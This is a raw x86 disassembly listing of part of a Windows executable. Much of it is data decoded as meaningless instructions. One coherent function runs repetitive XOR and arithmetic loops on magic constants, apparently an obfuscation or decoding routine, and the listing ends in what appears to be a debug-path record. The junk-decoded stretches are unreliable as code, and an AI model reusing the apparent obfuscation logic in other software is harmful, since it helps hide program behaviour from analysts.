  41c73d:	adc    DWORD PTR [ebp-0x2c1dbf9b],ecx
  41c743:	out    dx,eax
  41c744:	(bad)  
  41c745:	cld    
  41c746:	aaa    
  41c747:	bound  esi,QWORD PTR [ebx]
  41c749:	lock adc DWORD PTR [ebx+0x351b0ffe],ebx
  41c750:	jmp    0x41c74b
  41c752:	or     esi,DWORD PTR [edx]
  41c754:	pop    eax
  41c755:	(bad)  
  41c756:	lock loopne 0x41c73d
  41c759:	xchg   edx,eax
  41c75a:	shl    ah,1
  41c75c:	add    eax,0xc09bbeeb
  41c761:	mov    al,0xc8
  41c763:	sbb    bh,dh
  41c765:	jle    0x41c705
  41c767:	mov    ch,0x76
  41c769:	dec    esi
  41c76a:	xor    ebp,DWORD PTR [esi+0x41]
  41c76d:	add    edi,0xd6d2d62d
  41c773:	nop
  41c774:	mov    esi,0x5888906
  41c779:	fwait
  41c77a:	mov    eax,0x6fbb8c56
  41c77f:	fsubr  QWORD PTR [ebp+0x3f494279]
  41c785:	add    eax,esp
  41c787:	ret    0x797f
  41c78a:	retf   0x18a9
  41c78d:	mov    ebx,DWORD PTR [ecx]
  41c78f:	ins    DWORD PTR es:[edi],dx
  41c790:	mov    al,0x60
  41c792:	dec    edx
  41c793:	fs mov cl,0xb2
  41c796:	fadd   QWORD PTR [ebp-0x1efb834d]
  41c79c:	nop
  41c79d:	adc    ch,BYTE PTR [ecx-0x32]
  41c7a0:	pop    ecx
  41c7a1:	mov    ecx,0xe3db34af
  41c7a6:	add    al,0xc3
  41c7a8:	(bad)  
  41c7a9:	test   WORD PTR [eax],di
  41c7ac:	jecxz  0x41c804
  41c7ae:	leave  
  41c7af:	popa   
  41c7b0:	lds    edi,FWORD PTR [edx]
  41c7b2:	add    BYTE PTR [ebx+0x48],ah
  41c7b5:	xchg   DWORD PTR [edi],eax
  41c7b7:	out    dx,al
  41c7b8:	jns    0x41c7c1
  41c7ba:	adc    eax,0x4d6bd223
  41c7bf:	setg   ah
  41c7c2:	mov    ebp,0x35939a7a
  41c7c7:	jmp    0x41c7ea
  41c7c9:	clc    
  41c7ca:	and    DWORD PTR cs:[edx+0x1a249b0f],esi
  41c7d1:	shr    BYTE PTR [ebx+esi*8+0x66],1
  41c7d5:	pop    ds
  41c7d6:	(bad)  
  41c7d8:	xor    eax,0xc8496599
  41c7dd:	icebp  
  41c7de:	mov    DWORD PTR [ebp+0x52],ecx
  41c7e1:	rcr    DWORD PTR [eax-0x78652934],cl
  41c7e7:	mov    esi,0x48336ad1
  41c7ec:	xor    BYTE PTR [esi-0x72],ch
  41c7ef:	cmp    eax,0x36bc824d
  41c7f4:	sub    dl,BYTE PTR [edx-0x3fdb6d84]
  41c7fa:	jg     0x41c802
  41c7fc:	cmp    BYTE PTR ds:0xa640bb22,dh
  41c802:	(bad)  
  41c803:	lds    edi,FWORD PTR [ebx-0x2865162f]
  41c809:	pop    ecx
  41c80a:	mov    DWORD PTR [ebx],ecx
  41c80c:	adc    DWORD PTR [ecx+0x5bc172cb],0x39
  41c813:	ret    
  41c814:	xor    BYTE PTR [ecx-0x225c1bf6],dl
  41c81a:	lock add eax,0x8216d0e7
  41c820:	push   edi
  41c821:	inc    eax
  41c822:	push   ss
  41c823:	rcl    BYTE PTR [esi+0x1c823bc1],cl
  41c829:	repz inc ebx
  41c82b:	fisub  WORD PTR [eax+0x2414f768]
  41c831:	push   0xffffff9b
  41c833:	jns    0x41c7bf
  41c835:	mov    ch,0xaf
  41c837:	add    BYTE PTR [eax],bh
  41c839:	jg     0x41c7d3
  41c83b:	inc    eax
  41c83c:	xchg   esi,eax
  41c83d:	and    BYTE PTR [edx+0x75],cl
  41c840:	mov    edx,0x10638288
  41c845:	and    al,0xd8
  41c847:	push   0x65
  41c849:	jg     0x41c8c8
  41c84b:	inc    edi
  41c84c:	adc    esi,edi
  41c84e:	mov    ss,WORD PTR [edx]
  41c850:	cld    
  41c851:	xor    bh,bl
  41c853:	mov    edi,0x3708b977
  41c858:	inc    ecx
  41c859:	cmp    al,0xdc
  41c85b:	push   es
  41c85c:	mov    esi,0xedd18cc0
  41c861:	mov    esi,esi
  41c863:	xchg   ecx,eax
  41c864:	add    al,0x37
  41c866:	dec    ecx
  41c867:	jnp    0x41c803
  41c869:	fadd   DWORD PTR [esi-0xb1d0fb8]
  41c86f:	lea    ecx,[eax]
  41c871:	mov    ds:0x663c7d1f,eax
  41c876:	inc    ebp
  41c877:	loope  0x41c8dc
  41c879:	or     al,0xa7
  41c87b:	xchg   esi,eax
  41c87c:	mov    esi,0x39b03191
  41c881:	(bad)  
  41c882:	push   cs
  41c883:	jno    0x41c8fd
  41c885:	(bad)  
  41c886:	and    ebx,DWORD PTR [edi-0x5a]
  41c889:	jae    0x41c84d
  41c88b:	and    al,0x5c
  41c88d:	xor    al,0x73
  41c88f:	repz adc ch,bh
  41c892:	xlat   BYTE PTR ds:[ebx]
  41c893:	push   0x3f
  41c895:	loope  0x41c8bd
  41c897:	xor    eax,0xb18c6a61
  41c89c:	out    0xb9,eax
  41c89e:	mov    ebx,0x2667a748
  41c8a3:	cld    
  41c8a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8a5:	aad    0x57
  41c8a7:	bound  esi,QWORD PTR [ebx-0x10]
  41c8aa:	das    
  41c8ab:	mov    al,ds:0xb3638161
  41c8b0:	jno    0x41c894
  41c8b2:	and    eax,0x785c0f43
  41c8b7:	push   esi
  41c8b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8b9:	ror    DWORD PTR [ebp-0x3b04766e],1
  41c8bf:	retf   
  41c8c0:	xchg   edx,eax
  41c8c1:	jno    0x41c84c
  41c8c3:	push   0x7a806143
  41c8c8:	aaa    
  41c8c9:	daa    
  41c8ca:	sub    al,BYTE PTR [edx+ebp*8]
  41c8cd:	lahf   
  41c8ce:	cmp    DWORD PTR [ecx-0x7784a421],esi
  41c8d4:	jg     0x41c883
  41c8d6:	and    DWORD PTR [ebx-0x4e],0x1c
  41c8da:	mov    esi,0x5827ff09
  41c8df:	adc    cl,BYTE PTR [edi+0x6f4774f1]
  41c8e5:	inc    ebp
  41c8e6:	test   eax,0x95796df2
  41c8eb:	imul   esi,DWORD PTR [esi+0x55],0x16
  41c8ef:	je     0x41c961
  41c8f1:	icebp  
  41c8f2:	outs   dx,BYTE PTR gs:[esi]
  41c8f4:	cmc    
  41c8f5:	rol    BYTE PTR [ebx],cl
  41c8f7:	aaa    
  41c8f8:	ror    DWORD PTR [eax],cl
  41c8fa:	add    ch,ch
  41c8fc:	jns    0x41c8f2
  41c8fe:	jno    0x41c952
  41c900:	ja     0x41c94c
  41c902:	xor    al,0x8f
  41c904:	dec    ebx
  41c905:	mov    esp,DWORD PTR [edx+0x6b]
  41c908:	jl     0x41c8f4
  41c90a:	add    al,0x3c
  41c90c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c90d:	cli    
  41c90e:	fisttp QWORD PTR [edi-0x7d88ab74]
  41c914:	mov    ds:0x80eec463,eax
  41c919:	lea    edx,es:[esp+ecx*8]
  41c91d:	repz and edx,DWORD PTR [edx+esi*8+0x652c6030]
  41c925:	add    BYTE PTR [esi-0x261a0587],dh
  41c92b:	pop    edx
  41c92c:	imul   ecx,DWORD PTR gs:[esi+0x23442f34],0x12
  41c934:	mov    eax,ds:0xf28762c0
  41c939:	test   eax,0x171b11d
  41c93e:	lods   eax,DWORD PTR ds:[esi]
  41c93f:	mov    cl,0x2f
  41c941:	ins    BYTE PTR es:[edi],dx
  41c942:	push   ebx
  41c943:	add    cl,BYTE PTR [ebx]
  41c945:	pop    ecx
  41c946:	cmp    eax,0x81cd49e6
  41c94b:	mov    al,0x9
  41c94d:	test   eax,0xe7f918fe
  41c952:	neg    DWORD PTR [edx]
  41c954:	into   
  41c955:	xor    bl,0xf7
  41c958:	getsec 
  41c95a:	jecxz  0x41c93a
  41c95c:	sbb    eax,DWORD PTR [esi+0x3db2e326]
  41c962:	jmp    0x5c12:0x294577
  41c969:	outs   dx,BYTE PTR ds:[esi]
  41c96a:	test   eax,0xe3e2aca7
  41c96f:	pop    esi
  41c970:	fst    DWORD PTR [edx+0x7796fef0]
  41c976:	adc    eax,0x76dec625
  41c97b:	and    BYTE PTR [edi],bl
  41c97d:	sbb    al,0xe3
  41c97f:	xor    dl,dl
  41c981:	fild   DWORD PTR [edi+esi*8-0x61c9b8c8]
  41c988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c989:	cmc    
  41c98a:	xchg   ebp,eax
  41c98b:	lock push eax
  41c98d:	jmp    FWORD PTR [eax+0x22]
  41c990:	leave  
  41c991:	push   ecx
  41c992:	aam    0x98
  41c994:	cmp    BYTE PTR [ecx+eax*1],0x3a
  41c998:	xor    bl,ah
  41c99a:	xor    BYTE PTR [ebx+0x6f886eb4],dl
  41c9a0:	sbb    dl,ch
  41c9a2:	xor    dl,bh
  41c9a4:	cli    
  41c9a5:	dec    edx
  41c9a6:	sti    
  41c9a7:	popf   
  41c9a8:	jbe    0x41c92b
  41c9aa:	mov    dl,0xd0
  41c9ac:	mov    DWORD PTR [ecx+eax*2-0x3f],edx
  41c9b0:	fs das 
  41c9b2:	push   0x53
  41c9b4:	sub    eax,0x4cd661bd
  41c9b9:	dec    ecx
  41c9ba:	out    0x3,al
  41c9bc:	cwde   
  41c9bd:	dec    cl
  41c9bf:	int3   
  41c9c0:	mov    edx,0x75696522
  41c9c5:	pop    esp
  41c9c6:	mov    ebp,0x699a9ccc
  41c9cb:	test   eax,0xa7984b05
  41c9d0:	scas   al,BYTE PTR es:[edi]
  41c9d1:	(bad)  
  41c9d2:	sar    edi,cl
  41c9d4:	cmp    DWORD PTR [ecx],esp
  41c9d6:	pop    ds
  41c9d7:	cld    
  41c9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9d9:	add    al,BYTE PTR [esp+edi*2]
  41c9dc:	pop    es
  41c9dd:	inc    esp
  41c9de:	dec    esi
  41c9df:	inc    ebp
  41c9e0:	sbb    DWORD PTR [esi+0x4c7e0874],0xad23355c
  41c9ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9eb:	lods   al,BYTE PTR ds:[esi]
  41c9ec:	in     eax,dx
  41c9ed:	or     esi,eax
  41c9ef:	xlat   BYTE PTR ds:[ebx]
  41c9f0:	inc    ecx
  41c9f1:	fwait
  41c9f2:	sub    DWORD PTR [eiz*1+0x796e60],0x7e
  41c9fa:	(bad)  
  41c9fc:	and    al,0x2a
  41c9fe:	imul   edx,DWORD PTR [edx-0x71cb3b6f],0xe
  41ca05:	sub    DWORD PTR ds:0x4c84081a,0x14
  41ca0c:	cmp    DWORD PTR [ebx+0x78ee4495],0x21
  41ca13:	les    ebx,FWORD PTR [esi-0x1b]
  41ca16:	jg     0x41ca29
  41ca18:	aad    0x53
  41ca1a:	scas   al,BYTE PTR es:[edi]
  41ca1b:	mul    BYTE PTR [edi]
  41ca1d:	adc    DWORD PTR [ecx],edx
  41ca1f:	aad    0x88
  41ca21:	ret    0xd242
  41ca24:	bound  ecx,QWORD PTR [esi]
  41ca26:	xor    BYTE PTR [edi+0x3236036b],bh
  41ca2c:	xchg   ebx,eax
  41ca2d:	scas   eax,DWORD PTR es:[edi]
  41ca2e:	inc    ecx
  41ca2f:	mov    dh,BYTE PTR [edx]
  41ca31:	cmp    BYTE PTR [edx+ebx*4],0x8e
  41ca35:	enter  0x6f34,0x97
  41ca39:	ins    BYTE PTR es:[edi],dx
  41ca3a:	pop    ds
  41ca3b:	pop    es
  41ca3c:	mov    ch,0xeb
  41ca3e:	adc    al,0x18
  41ca40:	add    eax,0xbce072e8
  41ca45:	and    eax,0x9b6b444c
  41ca4a:	sbb    edx,esp
  41ca4c:	or     al,0xec
  41ca4e:	jmp    0x41ca52
  41ca50:	scas   eax,DWORD PTR es:[edi]
  41ca51:	pushf  
  41ca52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca53:	jp     0x41cac1
  41ca55:	lods   al,BYTE PTR ds:[esi]
  41ca56:	(bad)  
  41ca57:	aas    
  41ca58:	cmp    ch,bl
  41ca5a:	aaa    
  41ca5b:	mov    dh,0x77
  41ca5d:	dec    esp
  41ca5e:	out    dx,al
  41ca5f:	ins    DWORD PTR es:[edi],dx
  41ca60:	cld    
  41ca61:	jb     0x41cac8
  41ca63:	pop    ss
  41ca64:	das    
  41ca65:	push   esp
  41ca66:	mov    BYTE PTR [ecx+0x13],dl
  41ca69:	mov    BYTE PTR [ecx],ch
  41ca6b:	push   esp
  41ca6c:	pop    edi
  41ca6d:	pop    edx
  41ca6e:	pop    ss
  41ca6f:	scas   eax,DWORD PTR es:[edi]
  41ca70:	inc    esi
  41ca71:	cmp    esp,DWORD PTR [edx+0x6e]
  41ca74:	mov    edx,0x99c7ca1f
  41ca79:	push   edx
  41ca7a:	out    dx,al
  41ca7b:	pop    eax
  41ca7c:	adc    DWORD PTR [eax-0x5c604de9],ebx
  41ca82:	cmp    bl,dl
  41ca84:	cmp    eax,DWORD PTR [edi-0x4f]
  41ca87:	cmp    ebp,DWORD PTR [edi]
  41ca89:	les    ebp,FWORD PTR ds:0xe0b1a9fe
  41ca8f:	(bad)  
  41ca91:	mov    al,0xeb
  41ca93:	fucom  st(7)
  41ca95:	push   es
  41ca96:	in     eax,dx
  41ca97:	je     0x41cabd
  41ca99:	dec    edi
  41ca9a:	inc    eax
  41ca9b:	jmp    0x41cb08
  41ca9d:	test   BYTE PTR [ebp+0x44f98d6d],dl
  41caa3:	imul   ebp,DWORD PTR [edi],0x67
  41caa6:	mov    dh,0x44
  41caa8:	mov    ah,0xc0
  41caaa:	mov    ds:0xc6ce4f64,al
  41caaf:	adc    dh,bh
  41cab1:	test   esi,esp
  41cab3:	fcomp  QWORD PTR [esi]
  41cab5:	idiv   BYTE PTR [esi+0x58]
  41cab8:	mov    al,ds:0x12371c33
  41cabd:	mov    cl,0x9f
  41cabf:	xor    DWORD PTR [ecx-0x65b3f72e],esi
  41cac5:	jae    0x41caf6
  41cac7:	jle    0x41ca71
  41cac9:	bound  ebp,QWORD PTR [edx+0x2ea57bc3]
  41cacf:	adc    esp,DWORD PTR [eax]
  41cad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cad2:	mov    ebp,0x4ce0e82
  41cad7:	std    
  41cad8:	xor    al,0xc1
  41cada:	cmp    cl,BYTE PTR [ecx-0x2f]
  41cadd:	sub    ch,BYTE PTR [esi]
  41cadf:	or     eax,0x5455abff
  41cae4:	mov    ecx,0xf015d4b4
  41cae9:	mov    esi,0x929bb224
  41caee:	or     BYTE PTR [ebp+0x6f],0xa8
  41caf2:	(bad)  
  41caf3:	sbb    al,0xd1
  41caf5:	adc    bl,al
  41caf7:	leave  
  41caf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caf9:	imul   BYTE PTR [esi-0x6d]
  41cafc:	pop    ebp
  41cafd:	jns    0x41cb35
  41caff:	pop    ds
  41cb00:	mov    al,0x1
  41cb02:	sti    
  41cb03:	cdq    
  41cb04:	push   edi
  41cb05:	sub    al,0x6e
  41cb07:	and    eax,0xdb96df57
  41cb0c:	sbb    eax,0xde908ac3
  41cb11:	xor    ch,bl
  41cb13:	or     cl,BYTE PTR [edi+0x71]
  41cb16:	jo     0x41ca9e
  41cb18:	bound  edi,QWORD PTR [ebx]
  41cb1a:	inc    eax
  41cb1b:	cmp    esp,ecx
  41cb1d:	push   0x71
  41cb1f:	push   esp
  41cb20:	ret    0x9a0f
  41cb23:	push   0x96738987
  41cb28:	dec    edx
  41cb29:	int    0x49
  41cb2b:	mov    DWORD PTR [ebx-0x32008eff],0x1278326d
  41cb35:	fwait
  41cb36:	and    eax,0xb0574559
  41cb3b:	fild   WORD PTR [ebx+0x6ab4c431]
  41cb41:	xor    esi,ecx
  41cb43:	enter  0x15b1,0x72
  41cb47:	pop    DWORD PTR [esi]
  41cb49:	daa    
  41cb4a:	sti    
  41cb4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb4c:	es ja  0x41cad1
  41cb4f:	inc    esi
  41cb50:	xchg   ecx,eax
  41cb51:	add    BYTE PTR [ecx+0x53],al
  41cb54:	pop    ss
  41cb55:	jmp    0xde686959
  41cb5a:	fdivrp st(1),st
  41cb5c:	(bad)  
  41cb5d:	into   
  41cb5e:	sbb    ebp,DWORD PTR [ecx]
  41cb60:	and    al,0x39
  41cb62:	and    edx,ebx
  41cb64:	mov    DWORD PTR [ebp-0x4c],edx
  41cb67:	mov    edx,DWORD PTR [ebp+0x8]
  41cb6a:	mov    ebx,DWORD PTR [ebp-0x48]
  41cb6d:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cb74:	mov    DWORD PTR [ebp-0x48],edx
  41cb77:	mov    edx,DWORD PTR [ebp+0x8]
  41cb7a:	mov    ebx,0xfa5e15e2
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	data16 cmp al,0x4a
  41ce47:	pop    edi
  41ce48:	xchg   esi,eax
  41ce49:	lods   al,BYTE PTR ds:[esi]
  41ce4a:	stc    
  41ce4b:	dec    ebp
  41ce4c:	xchg   esp,eax
  41ce4d:	test   al,0x8f
  41ce4f:	xor    BYTE PTR [eax+0x70],bl
  41ce52:	sbb    BYTE PTR [ebx],ch
  41ce54:	add    DWORD PTR [eax],eax
  41ce56:	add    BYTE PTR [eax],al
  41ce58:	inc    ebx
  41ce59:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41ce5d:	jb     0x41ced1
  41ce5f:	outs   dx,BYTE PTR gs:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
